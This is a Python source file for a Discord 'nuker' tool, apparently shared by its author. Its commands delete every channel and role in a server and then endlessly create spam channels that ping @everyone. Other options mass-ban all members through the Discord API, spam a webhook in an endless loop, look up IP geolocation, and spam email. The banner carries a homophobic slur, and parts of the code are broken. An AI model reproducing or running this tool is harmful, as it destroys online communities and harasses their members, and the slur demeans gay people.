from dataclasses import dataclass
from distutils.command.config import config
from distutils.log import error
from email import message
import email
from errno import errorcode
from http import server
from lib2to3.pgen2.token import GREATER
from multiprocessing.connection import wait
import os
import threading
from tkinter import E
from urllib import response
from wsgiref import headers
import requests
from telnetlib import PRAGMA_HEARTBEAT, STATUS
from turtle import title
from unicodedata import name
import discord
import time
import colorama
colorama.init()
from colorama import Fore 
import pyautogui
import dhooks
from dhooks import Webhook
import urllib.request as urllib2
import json
import smtplib, ssl
import itertools
import sys





#Coded by C R A B#1592
#DM if you have any problems with the nuker
#Don't touch anything unless u know what ur doing
#Fuck skids <3


done = False
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading... ' + c)
        sys.stdout.flush()
        time.sleep(5)
    sys.stdout.write('\rDone! loading nuker!')

t = threading.Thread(target=animate)
t.start()
done = True

time.sleep(5)

print(f"{Fore.LIGHTMAGENTA_EX}" +"""




██████──██████─████████──████████─████████████───████████████████───██████████████─
─██░░██──██░░██─██░░░░██──██░░░░██─██░░░░░░░░████─██░░░░░░░░░░░░██───██░░░░░░░░░░██─
─██░░██──██░░██─████░░██──██░░████─██░░████░░░░██─██░░████████░░██───██░░██████░░██─
─██░░██──██░░██───██░░░░██░░░░██───██░░██──██░░██─██░░██────██░░██───██░░██──██░░██─
─██░░██████░░██───████░░░░░░████───██░░██──██░░██─██░░████████░░██───██░░██──██░░██─
─██░░░░░░░░░░██─────████░░████─────██░░██──██░░██─██░░░░░░░░░░░░██───██░░██──██░░██─
─██░░██████░░██───────██░░██───────██░░██──██░░██─██░░██████░░████───██░░██──██░░██─
─██░░██──██░░██───────██░░██───────██░░██──██░░██─██░░██──██░░██─────██░░██──██░░██─
─██░░██──██░░██───────██░░██───────██░░████░░░░██─██░░██──██░░██████─██░░██████░░██─
─██░░██──██░░██───────██░░██───────██░░░░░░░░████─██░░██──██░░░░░░██─██░░░░░░░░░░██─
─██████──██████───────██████───────████████████───██████──██████████─██████████████─
────────────────────────────────────────────────────────────────────────────────────
Made by C R A B#1592 on Discord | If you skid you're a faggot  
==============================
[1] - Nuke Server
[2] - Massban
[3] - Massunban
[4] - Webhook Spammer
[5] - IP Information Finder

""")





                                                                             
                                                                    
choice = input("Choice: ")


 




from discord.ext import commands
from discord.utils import get 



configFile = open('config.txt',encoding='utf8', mode='r')
delimeter = '='




def findValue(fullString):
    fullString = fullString.rstrip('\n')
    value = fullString[fullString.index(delimeter)+1:]
    return value

for line in configFile:
    if line.startswith('token'):
        token = findValue(line)
        
        if token == None:
            print("No token detected! quitting")
            quit
    if line.startswith('channels'):
        channelName = findValue(line)
       
    if line.startswith('message'):
        messageToSpam = findValue(line)
       
    if line.startswith('name'):
        serverName = findValue(line)
    if line.startswith('role'):
        role = findValue(line)


bot = commands.Bot(command_prefix= "*", case_insensitive = True, help_command=None, intents = discord.Intents.all())
@bot.event
async def on_ready():
    pass

@bot.command()
@commands.has_permissions(ban_members=True)
async def nuke(ctx):
    wait
    await ctx.message.delete()
    for c in ctx.guild.channels:
        await c.delete()
        print(f"{Fore.GREEN} Deleted channel {c}")
        
    for v in ctx.guild.voice_channels:
        await v.delete()
        print(f"{Fore.GREEN} Deleted channel {v}")
        
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{Fore.GREEN} Deleted role {r}")
        except:
            print(f"{Fore.RED} Couldn't delete role {r}")


    allowed_mentions = discord.AllowedMentions(everyone=True)
    guild = ctx.message.guild
    author = ctx.author.id
    while True:
        channel = await guild.create_text_channel(channelName)
        print(f"{Fore.GREEN} Created channel {channel}")
        await channel.send(content = messageToSpam, allowed_mentions=allowed_mentions)
        await guild.create_role(name=role)
        print(f"{Fore.GREEN} Created role {role}")
        await guild.edit(name=serverName)

   

headers = {
        "Authorization":
        f"Bot {token}"
    }




@bot.command()
async def massban(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
            headers=headers
        )

    for i in range(3):
        for member in list(ctx.guild.members):
            threading.Thread(
                print(Fore.GREEN + "Massbanning all members...."),
                target=mass_ban,
                args=(member.id,),
                
            ).start()




@bot.command()
async def massunban(ctx):
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await ctx.guild.unban(user=users.user)
            except:
                pass
        await ctx.send(f"unbanned {users}")


async def webhookspammer():
    webhook = input(f"{Fore.RED} Enter the webhook you want to spam: ")
    message = input(f"{Fore.RED} Enter the message you want to spam: ")
    hook = Webhook(webhook)
    while True:
        hook.send(message)
        print(f"{Fore.GREEN} message was sent sucesfully!")
        
async def ipinfofinder():
    ip = input(f"{Fore.RED}IP:  ")
    while True:
        url = "http://ip-api.com/json/"
        response = urllib2.urlopen(url + ip)
        data = response.read()
        values = json.loads(data)

        print(f"{Fore.GREEN} IP: " + values['query'])
        print(f"{Fore.GREEN} City: " + values['city'])
        print(f"{Fore.GREEN} ISP: " + values['isp'])
        print(f"{Fore.GREEN} Country: " + values['country'])
        print(f"{Fore.GREEN} Region: " + values['region'])
        print(f"{Fore.GREEN} Timezone: " + values['timezone'])
        input = ("Exit? : (Y/N)")
       
            
        break


async def emailspammer():
    email = input(f" Enter a valid email adress: ")
    password = input(f" Enter the email password: ")
    message = input(f" Enter the message you want to spam: ")
    reciever = email
    port = 465

    sslcontext = ssl.create_default_context()
    connection = smtplib.SMTP_SSL("smptp.gmail.com",port,context=sslcontext)
    connection.login(email,password)
    connection.sendmail(email,reciever,message)
    print(f"{Fore.GREEN} {message} was sent sucesfully!")




if choice == "1":
    print(f"{Fore.GREEN}Send *nuke in chat to nuke the server <3")
    nuke
if choice == "2":
    print(F"{Fore.GREEN} Send *massban in chat to massban!")
    massban
if choice == "3":
    print(f"{Fore.GREEN} Send *massunban in chat to massunban!")
    massunban
if choice == "4":
    colorama.init()
    webhook = input(" Enter the webhook you want to spam: ")
    message = input(" Enter the message you want to spam: ")
    hook = Webhook(webhook)
    while True:
        hook.send(message)
        print(f"{Fore.GREEN} message was sent sucesfully!")
    
   
if choice == "5":
    colorama.init()
    ip = input( "IP:  ")
    while True:
        url = "http://ip-api.com/json/"
        response = urllib2.urlopen(url + ip)
        data = response.read()
        values = json.loads(data)

        print(f"{Fore.GREEN} IP: " + values['query'])
        print(f"{Fore.GREEN} City: " + values['city'])
        print(f"{Fore.GREEN} ISP: " + values['isp'])
        print(f"{Fore.GREEN} Country: " + values['country'])
        print(f"{Fore.GREEN} Region: " + values['region'])
        print(f"{Fore.GREEN} Timezone: " + values['timezone'])
        input = ("Exit? : (Y/N)")
        
        break
    



    

        
        
    
time.sleep(4)

bot.run(token)
